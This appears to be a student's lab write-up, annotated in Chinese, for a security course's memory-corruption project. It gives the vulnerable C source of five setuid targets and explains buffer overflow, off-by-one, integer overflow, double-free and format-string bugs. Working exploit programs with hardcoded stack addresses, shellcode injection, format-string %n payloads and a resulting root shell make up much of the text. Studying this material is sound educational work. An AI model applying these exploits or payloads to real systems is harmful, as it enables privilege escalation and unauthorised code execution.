# cs155

- [Proj1](#proj1)
    + [Target1 Buffer overflow](#target1-buffer-overflow)
    + [Target2 Off-by-one](#target2-off-by-one)
    + [Target3 Integer overflow](#target3-integer-overflow)
    + [Target4 Double free](#target4-double-free)
    + [Target5 Format string](#target5-format-string)

# Proj1
## Target1 Buffer overflow
```c
int bar(char *arg, char *out)
{
  strcpy(out, arg);
  return 0;
}

void foo(char *argv[])
{
  char buf[256];
  bar(argv[1], buf);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
最基本的buffer overflow，直接更改return的地址，指向buf前面的NOP，然后进入执行shellcode
```c
int main(void)
{
  // put '\0' at the end
  char sploitstring[256 + 2 * sizeof(int) + 1];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;

  // shellcode is a string which ends with '\0'
  // should not copy '\0' to buffer otherwise
  // there wont be a buffer overflow
  memcpy(sploitstring + 100, shellcode, sizeof(shellcode) - 1);

  // address of eip
  int *ret = (int *) (sploitstring + 256 + sizeof(int));
  *ret = 0xbffffc5c;


  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target2 Off by one
虽然nstrcpy做了范围check，但是多复制了一个byte，因此可以overflow `%ebp`
```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}

void foo(char *argv[])
{
  bar(argv[1]);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target2: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
因为x86用的是little endian，所以溢出的两个byte就是`%ebp`的最后的两个byte，比如原来系统中`%ebp`为`0xbffffd90`，因为`sploitstring[200]=0`，所以`%ebp`就变为`0xbffffd00`，因为buf里面有201个byte，但是32位机器要连续两个word，所以溢出了两个byte

buf从`0xbffffcc8`开始，`%ebp=0xbffffd90`，buf溢出后修改`%ebp`的最后两个byte使得`%ebp`变成`%ebp=0xbffffd00`也就是在buf中间的`new_ebp`，当函数返回时，`%esp`会从`new_ebp`中load，为了方便显示，`0xbffffd00`中存了`0xffffffff`，然后`%esp`拿栈顶来load给`%eip`也就数`new_ebp`后面的`new_eip`，这也是shellcode的起始地址

**target1和target2的区别**

target2中，main调用了foo，foo调用了bar，bar里面buffer overflow，而target1中main只调用了foo，这里就是最大的区别。因为target2中，overflow了bar这个frame的`%ebp`，然后返回到foo的时候，`%esp`从`%ebp`里面load，foo想要返回时，取esp上面的也就是被替换的`%eip`返回，从而进入了shellcode。target1中，overflow了foo这个frame的`%ebp`和`%eip`，然后`%esp` load了`%ebp=0x90909090`，返回进入了shellcode，即使`%ebp`被改了也没问题。

```
                                  ^------------|
                                  |            v
addr: 0xbffffcc8  0xbffffd00 0xbffffd04                          
       [buffer  ...  new_ebp   new_eip ... shellcode]|[ebp]|[return]
val:              0xffffffff 0xbffffd08            0xbffffd00
                        ^                               |
                        |-------------------------------v
```


```console
$ (gdb) x/100x buf
0xbffffcc8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcd8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffce8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcf8: 0x90909090  0x90909090  0xffffffff  0xbffffd08
0xbffffd08: 0x895e1feb  0xc0310876  0x89074688  0x0bb00c46
0xbffffd18: 0x4e8df389  0x0c568d08  0xdb3180cd  0xcd40d889
0xbffffd28: 0xffdce880  0x622fffff  0x732f6e69  0x90909068
0xbffffd38: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd48: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd58: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd68: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd78: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd88: 0x90909090  0x90909090  0xbffffd00  0x0804854e
                                         ^
                                        %ebp
```
```c
int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  
  int offset = 0xbffffd00 - 0xbffffcc8;
  *(int *) (sploitstring + offset) = 0xffffffff;
  *(int *) (sploitstring + offset + 4) = 0xbffffd00 + 4 + 4;
  memcpy(sploitstring + offset + 4 + 4, shellcode, strlen(shellcode)); 

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target3 Integer overflow
```c
struct widget_t {
  double x;
  double y;
  int count;
};

#define MAX_WIDGETS 1000

int foo(char *in, int count)
{
  struct widget_t buf[MAX_WIDGETS];

  if (count < MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));

  return 0;
}

int main(int argc, char *argv[])
{
  int count;
  char *in;

  if (argc != 2)
    {
      fprintf(stderr, "target3: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);

  /*
   * format of argv[1] is as follows:
   *
   * - a count, encoded as a decimal number in ASCII
   * - a comma (",")
   * - the remainder of the data, treated as an array
   *   of struct widget_t
   */

  count = (int)strtoul(argv[1], &in, 10);
  if (*in != ',')
    {
      fprintf(stderr, "target3: argument format is [count],[data]\n");
      exit(EXIT_FAILURE);
    }
  in++;                         /* advance one byte, past the comma */
  foo(in, count);

  return 0;
}
```
关键的是要满足以下几个条件，有符号的count要小于1000，无符号的要满足`(20 * count) mod (2^32) = k`略大于20000，但是又不能太大，否则会seg fault

所以是`20 * count = k + 2^32 * r`，`count = k/20 + 2^32*r/20`，因为k需要略大于20000才能overflow并且需要是20的整数倍，所以取`k=20020`，又因为count需要overflow int，所以`1001+2^32*r/20 > 2^32 - 1`，因此取`r=10`，所以`count=1001+2^31=2147484649`，所以`(20 * 2147484649) mod 2^32 = 20020`，插入shellcode然后修改return地址即可


```c
if (count < MAX_WIDGETS) 
    memcpy(buf, in, count * sizeof(struct widget_t));
```
```c
int main(void)
{

  char sploitstring[1000 * (2 * sizeof(double) + sizeof(int)) + 4 + 11];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  // sizeof(struct widget_t) = 20
  // (20 * count) mod 2^32 = 1000 * 20 + 4 + 1
  // (int) count < 0
  // printf("%zu\n", 2147484649*20)=20020
  char *countstring = "2147484649,";
  memcpy(sploitstring, countstring, strlen(countstring));
  memcpy(sploitstring + 40, shellcode, strlen(shellcode));
  *(int *)(sploitstring + 20000 + strlen(countstring) + 4) = 0xbfff6210;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target4 Double free
```c
int foo(char *arg)
{
  char *p;
  char *q;

  if ( (p = tmalloc(500)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }
  if ( (q = tmalloc(300)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    } 

  tfree(p);
  tfree(q);
  
  if ( (p = tmalloc(1024)) == NULL)
    {
      fprintf(stderr, "tmalloc failure\n");
      exit(EXIT_FAILURE);
    }

  obsd_strlcpy(p, arg, 1024);

  tfree(q);

  return 0;
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target4: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv[1]);
  return 0;
}
```
这里的漏洞是，先tmalloc了p和q，然后tfree了p和q，然后又tmalloc了p，又tfree了q，这里q被free了两次，而第二次tmalloc的p大小刚好覆盖了之前q的位置，拷贝buffer进入heap的时候，可以overflow q指针，当free q指针的时候，就可以导致程序执行顺序错乱
```c
p = tmalloc(500);
q = tmalloc(300);
tfree(p);
tfree(q);
p = tmalloc(1024);
tfree(q);
```
首先先看tmalloc.c里面对chunk的定义，可以看到，每个chunk有个头，头里面是l和r指针，指向的是其他free的heap空间
```c
typedef union CHUNK_TAG
{
  struct
    {
      union CHUNK_TAG *l;       /* leftward chunk */
      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
    } s;
  ALIGN x;
} CHUNK;
```
也就是说，chunk在内存中是这样安排的
```bash
(high mem address)
[data] <data_size> (direct pointer to data points here)
[next ptr] <4>
[prev ptr] <4> (next/prev pointers from other structs point here)
[...] <4>
(low mem address)
```
每次要tfree一个指针q时，会执行以下操作
```c
q.next.prev = q.prev
q.prev.next = q.next
```
因此，首先在buffer里面找到q的位置，设置
```c
*(int *)(sploitstring + 512 - 8) = 0x0804a068; // q.prev = shellcode
*(int *)(sploitstring + 512 - 4) = 0xbffffa70; // q.next = eip
```
当free q指针时，要做`q.next.prev=q.prev`，具体来说就是因为之前已经设置了`q.next=eip`，这里`q.next.prev=(chunk*)eip->prev=*eip`，所以一旦free了q指针，就改变了eip里头的东西，程序就返回到了shellcode。还要注意的是，要把q的free bit置位，然后通过jmp指令跳过eip指向的地址内容发生错乱也就是这里的`\x90`
```c
int main(void)
{
  char sploitstring[1024];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;
  memcpy(sploitstring + 32, shellcode, strlen(shellcode));
  // p = 0x804a068
  // q = 0x804a268
  // q.bk = eip + 1
  // q.bk.fd = p
  *(int *)(sploitstring + 512 - 8) = 0x0804a068;
  *(int *)(sploitstring + 512 - 4) = 0xbffffa70;
  *(int *)(sploitstring + 4) = -1;
  *(short *)(sploitstring) = 0x0ceb;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target5 Format string
```c
int foo(char *arg)
{
  char buf[400];
  snprintf(buf, sizeof buf, arg);
  return 0;
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target5: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv[1]);
  return 0;
}
```
先要理解c中可变参数函数的工作原理，传入的第一个参数叫做format string，然后可以传入任意数量的参数
```c
typedef char *va_list;

#define _AUPBND (sizeof (acpi_native_int) - 1)
#define _ADNBND (sizeof (acpi_native_int) - 1)

#define _bnd(X, bnd) (((sizeof (X)) + (bnd)) & (~(bnd)))
#define va_arg(ap, T) (*(T *)(((ap) += (_bnd (T, _AUPBND))) - (_bnd (T,_ADNBND))))
#define va_end(ap) (void) 0
#define va_start(ap, A) (void) ((ap) = (((char *) &(A)) + (_bnd (A,_AUPBND))))

//start.c
static char sprint_buf[1024];
int printf(char *fmt, ...)
{
  va_list args;
  int n;
  va_start(args, fmt);
  n = vsprintf(sprint_buf, fmt, args);
  va_end(args);
  write(stdout, sprint_buf, n);
  return n;
}

int main()
{
  char *str = "hello world";
  int a = 10;
  double b = 20.0;
  printf("str: %s a: %d b: %f", str, a, b);
  printf("str: %s a: %d b: %f", str, a);
}
```
例如第一个printf调用时，倒序把参数进栈，首先压入b，然后压入a，然后压入str的地址，然后压入format string的地址，printf会parse format字符串，输出`str: `，当发现第一个`%s`时候，会向上找大小为`sizeof(char*)`的内容，并认为他是一个指向字符串的指针，输出的stdout，然后继续输出` a: `，发现`%d`时，出栈并认为是一个int然后输出，依次类推。如果出现第二个printf情况时，format string给了三个`%`，但是实际只给如了两个参数，一般的编译器并不会发现问题，而程序会继续往后找一个double的大小，然后输出到stdout，因此如果由用户给如format string，会暴露严重的安全漏洞。
```bash
---------
b = 20.0
---------
a = 10
---------
&str       ---->  "hello world"
---------
&format    ---->  "str: %s a: %d b: %f"
---------
eip
---------
old_ebp
---------
local
---------
```
常见的攻击方法有以下几种
### Crash program
`printf("%s%s%s%s%s")`，会不断dereference null pointer，直到程序崩溃
### View memory
`printf ("%08x.%08x.%08x.%08x.%08x\n")`，可以直接打出内存中的内容，也可以拿到特定内存地址的内容，比如`printf ("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|")`可以拿到`0x08480110`位置的内容。因为可以直接把`0x08480110`放入栈中，然后计算要偏移几次，这里从format string之后要偏移5次，然后用`%s`输出即可
```bash
----------
0x08480110 <----
----------     |
----------     |
----------     |
----------     |
----------     |
----------     |
&format    ---->
----------
---------- <---- eip
```
### Overwrite memory
这必须要用神奇的`%n`，意思是count已经输出的字符数并存入给的值中，比如，在遇到`%n`之前，已经输出了6个字符，然后把6存入i中，要注意的是，这里传入的是i的地址。
```c
int i;
printf("hello %n", &i);
```
因此，format string不仅仅可以看内存，其实还可以修改内存，这就可以用类似的方法，把call stack中return address改变为shellcode，导致严重的安全问题。

target5中，用的是snprintf(buf, maxLength, format, ...)，注意这里有range check，因此不能overflow，call stack如下所示，先push format string的地址，然后是maxLength，然后是buffer的地址，我们的目标就是把return address中的内容修改为想要的地址，从那儿开始可以滑入shellcode。但是我们发现，`0xbffffe5f-0xbffffb4c=787`，想要通过`%08x`来前进栈指针，`787/4*4>400`是不可能拷贝进入format string的，所以这里要好好利用snprintf的特性，因为在遇到`%`之前，字符会放入buf中，当遇到`%`时，其实可以利用刚刚放入buf的东西来exploit
```bash
----------
format
---------- 0xbffffe5f <--- format
    .
    .
    .
----------
---------- 0xbffffb4c <--- buffer
0xbffffe5f
---------- 0xbffffb48 <--- &format
400
---------- 0xbffffb44 <--- maxLength
0xbffffb4c
---------- 0xbffffb40 <--- &buffer
0x080484e8
---------- 0xbffffb48 <--- return
---------- 0xbffffb48 <--- old_ebp
```
我们这里的目标是把return address中的`0x080484e8`修改为`0xbffffe9f`，这里`0xbffffe9f`指向的是shellcode前面的`\x90`

详细call stack如下所示，snprintf会先把format中`%`之前的字符全都拷贝进入buffer里面，然后开始parse format string。

- **`%127u%n`**: 把`0xbffffb4c`里面的按照127的宽度输出，所以`32+127=0x9f`，通过`%n`存入`0xbffffb3c`指向的地址中，也就是修改了return address的最低两位，这时候return address是`0x0000009f`

- **`%95u%n`**: 把`0xbffffb54`里面的按照95的宽度输出，所以`32+127+95=0xfe`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0x0000fe9f`

- **`%257u%n`**: 把`0xbffffb54`里面的按照257的宽度输出，所以`32+127+95+257=0x1ff`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0x01fffe9f`

- **`%192u%n`**: 把`0xbffffb54`里面的按照192的宽度输出，所以`32+127+95+257+192=0x2bf`，通过`%n`存入`0xbffffb3c`指向的地址中，这时候return address是`0xbffffe9f`

**终于拿到root了！开心！撒花！**

```console
user@vm-cs155:~/cs155/proj1/sploits$ ./sploit5
#
```

```bash
----------
format: "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
        "%127u%n%95u%n%257u%n%192u%n";
---------- 0xbffffe5f <--- format
    .
    .
    .
---------- 0xbffffb6c
0xbffffb3c
---------- 0xbffffb68
0xffffffff
---------- 0xbffffb64
0xbffffb3c
---------- 0xbffffb60
0xffffffff
---------- 0xbffffb5c
0xbffffb3c
---------- 0xbffffb58
0xffffffff
---------- 0xbffffb54
0xbffffb3c
---------- 0xbffffb50
0xffffffff
---------- 0xbffffb4c <--- buffer
0xbffffe5f
---------- 0xbffffb48 <--- &format
400
---------- 0xbffffb44 <--- maxLength
0xbffffb4c
---------- 0xbffffb40 <--- &buffer
0x080484e8
---------- 0xbffffb48 <--- return
---------- 0xbffffb48 <--- old_ebp
```
```c
int main(void)
{
  char sploitstring[400];
  char *fmt;

  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring)-1] = '\0';

  fmt = "\xff\xff\xff\xff\x3c\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3d\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3e\xfb\xff\xbf"
        "\xff\xff\xff\xff\x3f\xfb\xff\xbf"
        "%127u%n%95u%n%257u%n%192u%n";

  memcpy(sploitstring, fmt, strlen(fmt));
  memcpy(sploitstring + sizeof(sploitstring) - strlen(shellcode) - 4, shellcode, strlen(shellcode));

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```